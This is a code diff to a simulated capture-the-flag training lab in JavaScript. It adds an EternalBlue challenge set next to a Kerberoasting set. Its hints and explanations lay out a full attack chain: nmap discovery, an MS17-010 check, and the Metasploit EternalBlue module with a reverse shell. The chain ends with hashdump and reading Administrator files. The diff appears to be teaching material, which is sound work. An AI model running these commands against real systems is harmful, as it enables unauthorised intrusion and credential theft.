@@ -1,6 +1,7 @@
 'use strict';
 
-const CTF_CHALLENGES = [
+// ── Kerberoasting challenges ──────────────────────────────────────────────────
+const KERBEROAST_CHALLENGES = [
   {
     id: 1, title: 'Port Scan the DC', pts: 100,
     flag: 'FLAG{dc01_discovered_ports_445_88_389}',
@@ -91,12 +92,94 @@ const CTF_CHALLENGES = [
   },
 ];
 
+// ── EternalBlue challenges ────────────────────────────────────────────────────
+const ETERNALBLUE_CHALLENGES = [
+  {
+    id: 1, title: 'Discover the Target', pts: 100,
+    flag: 'FLAG{win7_host_discovered_10_10_20_10}',
+    hint: 'sudo nmap -sn 10.10.20.0/24',
+    explain: 'Before we can attack anything we need to know what\'s on the network. A ping sweep with nmap -sn sends ICMP packets to every address in the subnet and reports which ones respond. We find a Windows 7 machine at 10.10.20.10 — Windows 7 is end-of-life and no longer receives security patches, making it a prime target.',
+    done: false,
+    check: r => r.id === 'nmap-eb-discovery',
+  },
+  {
+    id: 2, title: 'Identify Vulnerability', pts: 150,
+    flag: 'FLAG{ms17_010_eternalblue_confirmed}',
+    hint: 'sudo nmap -sV --script smb-vuln-ms17-010 10.10.20.10',
+    explain: 'MS17-010 is the vulnerability exploited by EternalBlue, originally developed by the NSA and leaked by Shadow Brokers in 2017. It\'s a critical flaw in Windows SMB (file sharing) that allows remote code execution with no authentication at all. The nmap smb-vuln-ms17-010 script checks if the target is unpatched. A "VULNERABLE" result means we can get a shell without any credentials.',
+    done: false,
+    check: r => r.id === 'nmap-eb-vuln',
+  },
+  {
+    id: 3, title: 'Launch Metasploit', pts: 100,
+    flag: 'FLAG{msfconsole_ready}',
+    hint: 'msfconsole',
+    explain: 'Metasploit is the most widely used exploitation framework in the world. It contains hundreds of pre-built exploits, payloads, and post-exploitation modules. msfconsole is its interactive shell. From here we can search for exploits, configure them, and fire them at targets. Think of it as a toolkit where all the hard exploit code is already written — you just point it at a target.',
+    done: false,
+    check: r => r.id === 'msfconsole',
+  },
+  {
+    id: 4, title: 'Load EternalBlue Module', pts: 150,
+    flag: 'FLAG{eternalblue_module_loaded}',
+    hint: 'use exploit/windows/smb/ms17_010_eternalblue',
+    explain: 'Metasploit organises exploits into modules by category. exploit/windows/smb/ms17_010_eternalblue is the EternalBlue module — it implements the full SMB exploit chain. The "use" command loads it and sets it as our active module. You\'ll see the prompt change to show the module name, confirming it\'s loaded and ready to configure.',
+    done: false,
+    check: r => r.id === 'msf-use',
+  },
+  {
+    id: 5, title: 'Configure the Exploit', pts: 150,
+    flag: 'FLAG{rhosts_lhost_configured}',
+    hint: 'set RHOSTS 10.10.20.10\nset LHOST 10.10.20.5',
+    explain: 'Every Metasploit module has options you need to set before running it. RHOSTS is the target IP — the machine we\'re attacking. LHOST is our own IP — where the reverse shell will connect back to. A reverse shell means the target machine reaches out to us, which bypasses most firewalls since outbound connections are usually allowed. show options lets you see all available settings.',
+    done: false,
+    check: r => r.id === 'msf-set',
+  },
+  {
+    id: 6, title: 'Run the Exploit', pts: 400,
+    flag: 'FLAG{meterpreter_session_opened}',
+    hint: 'run',
+    explain: 'With the options configured, "run" fires the exploit. EternalBlue sends a specially crafted SMB packet that triggers a buffer overflow in the Windows kernel, giving us code execution before any authentication happens. If successful, our payload (Meterpreter) is injected into memory and calls back to our LHOST. Meterpreter is an advanced shell that runs entirely in RAM — it never touches the disk, making it very hard for antivirus to detect.',
+    done: false,
+    check: r => r.id === 'msf-run',
+  },
+  {
+    id: 7, title: 'Verify Access', pts: 200,
+    flag: 'FLAG{nt_authority_system_eternalblue}',
+    hint: 'getuid\nsysinfo',
+    explain: 'EternalBlue exploits a kernel-level vulnerability, so the shell we get lands directly as NT AUTHORITY\\SYSTEM — the highest privilege on Windows — without any privilege escalation needed. getuid confirms who we are, sysinfo shows the machine details. We\'re fully in control of this machine without ever having a username or password.',
+    done: false,
+    check: r => r.id === 'msf-getuid',
+  },
+  {
+    id: 8, title: 'Dump Password Hashes', pts: 300,
+    flag: 'FLAG{sam_hashes_dumped}',
+    hint: 'hashdump',
+    explain: 'hashdump reads the SAM (Security Account Manager) database — the local password hash store on every Windows machine. Because we\'re running as SYSTEM we can read it directly. The output shows every local account and their NT hash. These hashes can be cracked offline with john or hashcat, or used directly in Pass-the-Hash attacks against other machines on the network.',
+    done: false,
+    check: r => r.id === 'msf-hashdump',
+  },
+  {
+    id: 9, title: 'Pillage the Filesystem', pts: 250,
+    flag: 'FLAG{secret_docs_exfiltrated}',
+    hint: 'shell\ntype C:\\Users\\Administrator\\Desktop\\secret.txt',
+    explain: 'From Meterpreter we can drop into a regular Windows command shell with the "shell" command. From there we can browse the filesystem just like we\'re sitting at the machine. The Administrator\'s desktop often has sensitive files left lying around — credentials, internal documents, flags. This step simulates the data exfiltration phase of a real attack.',
+    done: false,
+    check: r => r.id === 'msf-shell-loot',
+  },
+];
+
 const CTF = {
-  challenges: CTF_CHALLENGES,
+  _lab: 'kerberoast',
+  _labs: {
+    kerberoast: KERBEROAST_CHALLENGES,
+    eternalblue: ETERNALBLUE_CHALLENGES,
+  },
+
+  get challenges() { return this._labs[this._lab]; },
 
   _loadState() {
     try {
-      const s = JSON.parse(localStorage.getItem('ctf_state') || '{}');
+      const s = JSON.parse(localStorage.getItem('ctf_state_' + this._lab) || '{}');
       this.challenges.forEach(c => { if (s[c.id]) c.done = true; });
     } catch {}
   },
@@ -104,12 +187,31 @@ const CTF = {
   _saveState() {
     const s = {};
     this.challenges.forEach(c => { if (c.done) s[c.id] = true; });
-    localStorage.setItem('ctf_state', JSON.stringify(s));
+    localStorage.setItem('ctf_state_' + this._lab, JSON.stringify(s));
   },
 
   score()    { return this.challenges.filter(c => c.done).reduce((a, c) => a + c.pts, 0); },
   maxScore() { return this.challenges.reduce((a, c) => a + c.pts, 0); },
   doneCount(){ return this.challenges.filter(c => c.done).length; },
+
+  switchLab(labId) {
+    if (!this._labs[labId]) return;
+    this._lab = labId;
+    // Reset SIM state for the new lab
+    SIM.windowsShell = false;
+    SIM.hashesOnDisk = false;
+    SIM.lootExfiltrated = false;
+    SIM.msfActive = false;
+    SIM.msfModule = null;
+    SIM.msfOptions = {};
+    SIM.meterpreter = false;
+    SIM.ebTarget = '10.10.20.10';
+    SIM.user = 'kali';
+    SIM.cwd  = '/home/kali';
+    TERM_INSTANCES.forEach(t => t._updatePrompt());
+    this._loadState();
+    this._renderSidebar();
+  },
 
   check(result) {
     if (!result || !result.id) return null;
@@ -125,12 +227,16 @@ const CTF = {
 
   reset() {
     this.challenges.forEach(c => c.done = false);
-    localStorage.removeItem('ctf_state');
+    localStorage.removeItem('ctf_state_' + this._lab);
     SIM.hashesOnDisk = false;
     SIM.windowsShell = false;
     SIM.lootExfiltrated = false;
+    SIM.msfActive = false;
+    SIM.msfModule = null;
+    SIM.msfOptions = {};
+    SIM.meterpreter = false;
     SIM.user = 'kali';
-    SIM.cwd  = '/home/capy';
+    SIM.cwd  = '/home/kali';
     TERM_INSTANCES.forEach(t => t._updatePrompt());
     this._renderSidebar();
   },
@@ -160,11 +266,10 @@ const CTF = {
         </div>
         ${c.done
           ? `<div class="ctf-flag">${c.flag}</div>`
-          : `<div class="ctf-hint-row"><span class="ctf-hint">${c.hint}</span><button class="ctf-copy-btn" data-cmd="${c.hint.replace(/"/g,'&quot;')}" title="Copy command"><i class="fa fa-copy"></i></button></div>`}
+          : `<div class="ctf-hint-row"><span class="ctf-hint">${c.hint.split('\n')[0]}</span><button class="ctf-copy-btn" data-cmd="${c.hint.replace(/"/g,'&quot;')}" title="Copy command"><i class="fa fa-copy"></i></button></div>`}
       </div>`
     ).join('');
 
-    // Attach explain click handlers
     list.querySelectorAll('.ctf-item').forEach(el => {
       el.addEventListener('click', e => {
         if (e.target.closest('.ctf-copy-btn')) return;
@@ -174,7 +279,6 @@ const CTF = {
       });
     });
 
-    // Attach copy handlers
     list.querySelectorAll('.ctf-copy-btn').forEach(btn => {
       btn.addEventListener('click', e => {
         e.stopPropagation();
@@ -216,11 +320,14 @@ const CTF = {
     this._loadState();
     this._renderSidebar();
 
+    document.getElementById('ctf-lab-select').addEventListener('change', e => {
+      this.switchLab(e.target.value);
+    });
+
     document.getElementById('ctf-reset-btn').addEventListener('click', () => {
       if (confirm('Reset all CTF progress?')) this.reset();
     });
 
-    // Explanation modal close
     const closeExplain = () => document.getElementById('ctf-explain-modal').classList.add('hidden');
     document.getElementById('ctf-explain-close').addEventListener('click', closeExplain);
     document.getElementById('ctf-explain-ok').addEventListener('click', closeExplain);
@@ -228,7 +335,6 @@ const CTF = {
       if (e.target === document.getElementById('ctf-explain-modal')) closeExplain();
     });
 
-    // CTF sidebar close button
     document.getElementById('ctf-close-btn')?.addEventListener('click', () => {
       document.getElementById('ctf-sidebar').classList.add('collapsed');
     });
